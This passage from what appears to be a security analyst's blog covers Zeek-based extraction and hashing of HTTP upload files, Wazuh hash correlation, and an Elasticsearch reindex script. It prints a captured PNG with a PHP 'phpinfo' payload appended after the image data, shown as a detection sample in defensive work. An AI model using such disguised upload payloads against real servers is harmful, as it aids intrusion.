class="string">&quot;image/png&quot;</span>] = <span class="string">&quot;png&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/pdf&quot;</span>] = <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/java-archive&quot;</span>] = <span class="string">&quot;jar&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/x-java-applet&quot;</span>] = <span class="string">&quot;jar&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/x-java-jnlp-file&quot;</span>] = <span class="string">&quot;jnlp&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/msword&quot;</span>] = <span class="string">&quot;doc&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.wordprocessingml.document&quot;</span>] = <span class="string">&quot;docs&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;</span>] = <span class="string">&quot;xlsx&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.presentationml.presentation&quot;</span>] = <span class="string">&quot;pptx&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">global file_analyzer: table[string] of bool = &#123;</span><br><span class="line">    [<span class="string">&quot;Extraction&quot;</span>] = T,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">global http_method: <span class="built_in">set</span>[string] = &#123;</span><br><span class="line">    <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">    <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">global http_hostname: <span class="built_in">set</span>[string] = &#123;</span><br><span class="line">  <span class="string">&quot;canon88.github.io&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">global http_uri: <span class="built_in">set</span>[string] = &#123;</span><br><span class="line">  <span class="string">&quot;/index.php&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/account.php&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> files_filter(rec: Files::Info): bool</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">return</span> rec?<span class="variable">$logs</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">event <span class="function"><span class="title">zeek_init</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">    Log::remove_default_filter(Files::LOG);</span><br><span class="line">    <span class="built_in">local</span> filter: Log::Filter = [<span class="variable">$name</span>=<span class="string">&quot;file_extraction&quot;</span>, <span class="variable">$path</span>=<span class="string">&quot;/data/logs/zeek/file_extraction&quot;</span>, <span class="variable">$pred</span>=files_filter];</span><br><span class="line">    Log::add_filter(Files::LOG, filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">event file_sniff(f: fa_file, meta: fa_metadata) &amp;priority=3</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> ( f<span class="variable">$source</span> != <span class="string">&quot;HTTP&quot;</span> )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! f<span class="variable">$http</span>?<span class="variable">$method</span> )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( f$http<span class="variable">$method</span> !<span class="keyword">in</span> http_method )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! f<span class="variable">$http</span>?<span class="variable">$host</span> )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( f$http<span class="variable">$host</span> !<span class="keyword">in</span> http_hostname )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! meta?<span class="variable">$mime_type</span> )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( meta<span class="variable">$mime_type</span> !<span class="keyword">in</span> mime_to_ext )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    f$info<span class="variable">$logs</span> = T;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( file_analyzer[<span class="string">&quot;Extraction&quot;</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">local</span> fname = fmt(<span class="string">&quot;%s-%s.%s&quot;</span>, f<span class="variable">$source</span>, f<span class="variable">$id</span>, mime_to_ext[meta<span class="variable">$mime_type</span>]);</span><br><span class="line">        Files::add_analyzer(f, Files::ANALYZER_EXTRACT, [<span class="variable">$extract_filename</span>=fname]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    Files::add_analyzer(f, Files::ANALYZER_MD5);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( http_info )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$host</span> )</span><br><span class="line">            f$info<span class="variable">$hostname</span> = f$http<span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$proxied</span> )</span><br><span class="line">            f$info<span class="variable">$proxied</span> = f$http<span class="variable">$proxied</span>;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$method</span> )</span><br><span class="line">            f$info<span class="variable">$method</span> = f$http<span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$uri</span> )</span><br><span class="line">            f$info<span class="variable">$url</span> = f$http<span class="variable">$uri</span>;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$true_client_ip</span> )</span><br><span class="line">            f$info<span class="variable">$true_client_ip</span> = f$http<span class="variable">$true_client_ip</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">event file_state_remove(f: fa_file)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !f<span class="variable">$info</span>?<span class="variable">$extracted</span> || !f<span class="variable">$info</span>?<span class="variable">$md5</span> || FileExtract::prefix == <span class="string">&quot;&quot;</span> || !f<span class="variable">$info</span>?<span class="variable">$logs</span> )</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">local</span> orig = f$info<span class="variable">$extracted</span>;</span><br><span class="line">        <span class="built_in">local</span> split_orig = split_string(f$info<span class="variable">$extracted</span>, /\./);</span><br><span class="line">        <span class="built_in">local</span> extension = split_orig[|split_orig|-1];</span><br><span class="line">        <span class="built_in">local</span> ntime = fmt(<span class="string">&quot;%D&quot;</span>, network_time());</span><br><span class="line">        <span class="built_in">local</span> ndate = sub_bytes(ntime, 1, 10);</span><br><span class="line">        <span class="built_in">local</span> dest_dir = fmt(<span class="string">&quot;%s%s&quot;</span>, FileExtract::prefix, ndate);</span><br><span class="line">        mkdir(dest_dir);</span><br><span class="line">        <span class="built_in">local</span> dest = fmt(<span class="string">&quot;%s/%s.%s&quot;</span>, dest_dir, f$info<span class="variable">$md5</span>, extension);</span><br><span class="line">        <span class="built_in">local</span> cmd = fmt(<span class="string">&quot;mv %s/%s %s&quot;</span>, FileExtract::prefix, orig, dest);</span><br><span class="line">        when ( <span class="built_in">local</span> result = Exec::run([<span class="variable">$cmd</span>=cmd]) )</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        f$info<span class="variable">$extracted</span> = dest;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h6 id="脚本简述：-1"><a href="#脚本简述：-1" class="headerlink" title="脚本简述："></a>脚本简述：</h6><pre><code> 1. 支持针对指定hostname，method，url，文件头进行hash的提取以及文件还原；
 2. 默认文件还原按照年月日进行数据的存储，保存名字按照MD5名称命名；
 3. 丰富化了文件还原的日志，增加HTTP相关字段；
</code></pre>
<h6 id="日志样例"><a href="#日志样例" class="headerlink" title="日志样例"></a>日志样例</h6><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;ts&quot;</span>: <span class="number">1588891497.173108</span>,</span><br><span class="line">  <span class="attr">&quot;fuid&quot;</span>: <span class="string">&quot;FhOGNc2zDdlF3AP5c&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;tx_hosts&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;1.1.1.1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rx_hosts&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;2.2.2.2&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;conn_uids&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;CItQs61wvvtPqSB0Ub&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;HTTP&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;depth&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;analyzers&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;MD5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SHA1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;EXTRACT&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;mime_type&quot;</span>: <span class="string">&quot;image/png&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;duration&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;local_orig&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;is_orig&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;seen_bytes&quot;</span>: <span class="number">353</span>,</span><br><span class="line">  <span class="attr">&quot;total_bytes&quot;</span>: <span class="number">353</span>,</span><br><span class="line">  <span class="attr">&quot;missing_bytes&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;overflow_bytes&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;timedout&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;md5&quot;</span>: <span class="string">&quot;fd0229d400049449084b3864359c445a&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;sha1&quot;</span>: <span class="string">&quot;d836d3f06c0fc075cf0f5d95f50b79cac1dac97d&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;extracted&quot;</span>: <span class="string">&quot;/data/logs/zeek/extracted_files/2020-05-07/fd0229d400049449084b3864359c445a.png&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;extracted_cutoff&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;canon88.github.io&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;proxied&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;TRUE-CLIENT-IP -&gt; 3.3.3.3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-FORWARDED-FOR -&gt; 4.4.4.4&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/image/close.png&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;method&quot;</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;true_client_ip&quot;</span>: <span class="string">&quot;3.3.3.3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;logs&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h6 id="文件还原"><a href="#文件还原" class="headerlink" title="文件还原"></a>文件还原</h6><p><strong>这是其中一个包含恶意Payload还原出的图片样例</strong></p>
<p><img src="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/Payload-pic.png" alt="image-20200511150738194"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ ll /data/logs/zeek/extracted_files/</span><br><span class="line">total 89916</span><br><span class="line">drwxr-xr-x 10 root root      150 May 11 06:14 ./</span><br><span class="line">drwxr-xr-x  4 root root       67 May 11 06:00 ../</span><br><span class="line">drwxr-xr-x  2 root root       50 May  5 07:54 2020-05-04/</span><br><span class="line">drwxr-xr-x  2 root root     4096 May  5 23:51 2020-05-05/</span><br><span class="line">drwxr-xr-x  2 root root   671744 May  6 23:41 2020-05-06/</span><br><span class="line">drwxr-xr-x  2 root root     4096 May  7 22:44 2020-05-07/</span><br><span class="line">drwxr-xr-x  2 root root   741376 May  8 23:59 2020-05-08/</span><br><span class="line">drwxr-xr-x  2 root root 23425024 May  9 23:59 2020-05-09/</span><br><span class="line">drwxr-xr-x  2 root root 25047040 May 10 23:59 2020-05-10/</span><br><span class="line">drwxr-xr-x  2 root root 24846336 May 11 06:14 2020-05-11/</span><br><span class="line"></span><br><span class="line">$ xxd /data/logs/zeek/extracted_files/2020-05-07/884d9474180e5b49f851643cb2442bce.jpg</span><br><span class="line">00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR</span><br><span class="line">00000010: 0000 003c 0000 003c 0806 0000 003a fcd9  ...&lt;...&lt;.....:..</span><br><span class="line">00000020: 7200 0000 1974 4558 7453 6f66 7477 6172  r....tEXtSoftwar</span><br><span class="line">00000030: 6500 4164 6f62 6520 496d 6167 6552 6561  e.Adobe ImageRea</span><br><span class="line">00000040: 6479 71c9 653c 0000 0320 6954 5874 584d  dyq.e&lt;... iTXtXM</span><br><span class="line">00000050: 4c3a 636f 6d2e 6164 6f62 652e 786d 7000  L:com.adobe.xmp.</span><br><span class="line">..........</span><br><span class="line">00001030: 8916 ce5f 7480 2f38 c073 69f1 5c14 83fb  ..._t./8.si.\...</span><br><span class="line">00001040: aa9d 42a3 8f4b ff05 e012 e04b 802f 01be  ..B..K.....K./..</span><br><span class="line">00001050: 04b8 91c7 ff04 1800 bcae 819f d1da 1896  ................</span><br><span class="line">00001060: 0000 0000 4945 4e44 ae42 6082 3c3f 7068  ....IEND.B`.&lt;?ph</span><br><span class="line">00001070: 7020 7068 7069 6e66 6f28 293b 3f3e 1a    p phpinfo();?&gt;.</span><br></pre></td></tr></table></figure>

<h6 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h6><p>通过Zeek脚本扩展后，可以<strong>“随意所欲”</strong>的获取各种类型文件的Hash以及定制化的进行文件还原。</p>
<h4 id="头脑风暴"><a href="#头脑风暴" class="headerlink" title="头脑风暴"></a>头脑风暴</h4><p>当获取文件上传的Hash之后，可以尝试扩展出以下2个安全事件：</p>
<ol>
<li><p>判断文件是否上传成功。</p>
<p>通常第一时间会需要定位文件是否上传成功，若上传成功需要进行相关的事件输出，这个时候我们可以通过采用HIDS进行文件落地事件的关联。</p>
</li>
<li><p>关联杀毒引擎/威胁情报。</p>
<p>将第一个关联好的事件进行Hash的碰撞，最常见的是将HASH送到VT或威胁情报。</p>
</li>
</ol>
<p>这里以<strong>Wazuh</strong>事件为例，将<strong>Zeek</strong>的文件还原事件与<strong>Wazuh</strong>的新增文件事件进行关联，关联指标采用<strong>Hash</strong>。</p>
<p><strong>a. Zeek事件</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;ts&quot;</span>: <span class="number">1589158812.471443</span>,</span><br><span class="line">  <span class="attr">&quot;fuid&quot;</span>: <span class="string">&quot;FBkqzM2AFg0jrioji6&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;tx_hosts&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;1.1.1.1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rx_hosts&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;2.2.2.2&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;conn_uids&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;CcOyQo2ziEuoLBNIb9&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;HTTP&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;depth&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;analyzers&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;SHA1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;EXTRACT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;MD5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;DATA_EVENT&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;mime_type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;duration&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;local_orig&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;is_orig&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;seen_bytes&quot;</span>: <span class="number">31</span>,</span><br><span class="line">  <span class="attr">&quot;total_bytes&quot;</span>: <span class="number">31</span>,</span><br><span class="line">  <span class="attr">&quot;missing_bytes&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;overflow_bytes&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;timedout&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;md5&quot;</span>: <span class="string">&quot;37a74f452f1c49854a2951fd605687c5&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;extracted&quot;</span>: <span class="string">&quot;/data/logs/zeek/extracted_files/2020-05-11/37a74f452f1c49854a2951fd605687c5.txt&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;extracted_cutoff&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;canon88.github.io&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;proxied&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;X-FORWARDED-FOR -&gt; 3.3.3.3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TRUE-CLIENT-IP -&gt; 4.4.4.4&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/index.php&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;true_client_ip&quot;</span>: <span class="string">&quot;4.4.4.4&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;logs&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>b. Wazuh 事件</strong></p>
<p><img src="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/Wazuh-Hash-1.png" alt="image-20200511144805354"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/03/29/Elasticsearch-alias%E4%B8%8Ereindex%E7%9A%84%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="一个热爱健身的安全分析师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/03/29/Elasticsearch-alias%E4%B8%8Ereindex%E7%9A%84%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/" class="post-title-link" itemprop="url">Elasticsearch-alias与reindex的使用场景</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-03-29 12:39:19" itemprop="dateCreated datePublished" datetime="2020-03-29T12:39:19+08:00">2020-03-29</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-04-04 19:17:25" itemprop="dateModified" datetime="2020-04-04T19:17:25+08:00">2020-04-04</time>
      </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.7k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>2 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
<li><strong><a target="_blank" rel="noopener" href="https://javasgl.github.io/elastic-search-reindex/">使用 reindex 来修改 elasticsearch 索引mapping</a></strong></li>
<li><strong><a target="_blank" rel="noopener" href="https://javasgl.github.io/use-alias-migrate-index/">使用 Elasticsearch alias 功能切换 index</a></strong></li>
<li><strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/mlljava1111/article/details/51218868">Elasticsearch更改mapping(不停服务重建索引)</a></strong></li>
<li><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jajian/p/10152681.html">Elasticsearch 技术分析（三）： 索引别名Aliases问题</a></strong></li>
<li><strong><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f67b046b4d3f">Elasticsearch 实战案例（索引切分、模板、别名、数据迁移）</a></strong></li>
<li><strong><a target="_blank" rel="noopener" href="http://abusehub-reindex.py/">abusehub-reindex.py/</a></strong></li>
</ul>
<h4 id="reindex"><a href="#reindex" class="headerlink" title="reindex"></a>reindex</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> elasticsearch <span class="keyword">import</span> Elasticsearch</span><br><span class="line"><span class="keyword">from</span> elasticsearch <span class="keyword">import</span> helpers</span><br><span class="line"></span><br><span class="line">host = [<span class="string">&#x27;es_host1&#x27;</span>, <span class="string">&#x27;es_host2&#x27;</span>, <span class="string">&#x27;es_host3&#x27;</span>]</span><br><span class="line">port = <span class="number">9200</span></span><br><span class="line">timeout = <span class="number">600</span></span><br><span class="line">auth_user = <span class="string">&#x27;elastic&#x27;</span></span><br><span class="line">auth_password = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">use_ssl = <span class="literal">True</span></span><br><span class="line">ca_certs = <span class="string">&#x27;/opt/certs/ca/ca.crt&#x27;</span></span><br><span class="line"></span><br><span class="line">es = Elasticsearch(host, port=port, timeout=timeout, http_auth=(auth_user, auth_password), verify_certs=<span class="literal">True</span>, use_ssl=use_ssl, ca_certs=ca_certs)</span><br></pre></td></tr></table></figure>



<h5 id="按照指定日期重建索引"><a href="#按照指定日期重建索引" class="headerlink" title="按照指定日期重建索引"></a>按照指定日期重建索引</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">begin_date = (datetime.datetime.now() - datetime.timedelta(days = <span class="number">10</span>)).strftime(<span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line">begin_date = datetime.datetime.strptime(begin_date, <span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line">end_date = (datetime.datetime.now() - datetime.timedelta(days = <span class="number">1</span>)).strftime(<span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line">end_date = datetime.datetime.strptime(end_date, <span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line"></span><br><span class="line">date_list = []</span><br><span class="line"><span class="keyword">while</span> begin_date &lt;= end_date:</span><br><span class="line">    date_str = begin_date.strftime(<span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line">    date_list.append(date_str)</span><br><span class="line">    begin_date += datetime.timedelta(days=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">date_list</span><br><span class="line">[<span class="string">&#x27;2020.03.19&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.20&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.21&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.22&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.23&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.24&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.25&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.26&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.27&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.28&#x27;</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chunk_size = <span class="number">10000</span></span><br><span class="line"><span class="keyword">for</span> day <span class="keyword">in</span> date_list:</span><br><span class="line">    source_index = <span class="string">&#x27;wazuh-alerts-3.x-&#x27;</span> + day</span><br><span class="line">    target_index = <span class="string">&#x27;siem-alerts-&#x27;</span> + day</span><br><span class="line">    helpers.reindex(</span><br><span class="line">        client=es, source_index=source_index, target_index=target_index, </span><br><span class="line">        target_client=es, chunk_size=chunk_size</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(source_index + <span class="string">&#x27; -&gt; &#x27;</span> + target_index + <span class="string">&#x27; 